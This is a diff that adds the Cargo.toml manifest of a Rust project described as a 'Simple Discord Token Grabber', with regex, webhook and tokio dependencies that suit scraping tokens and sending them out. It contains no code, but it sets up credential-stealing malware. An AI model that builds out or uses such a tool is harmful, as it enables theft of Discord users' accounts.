@@ -1,0 +1,12 @@
+[package]
+name = "tg"
+version = "0.1.0"
+edition = "2018"
+description = "Simple Discord Token Grabber"
+authors = ["Fn79"]
+
+
+[dependencies]
+regex = "1.5.4"
+webhook = "1.0.0"
+tokio = { version = "0.2.22", features = ["full", "tracing"] }
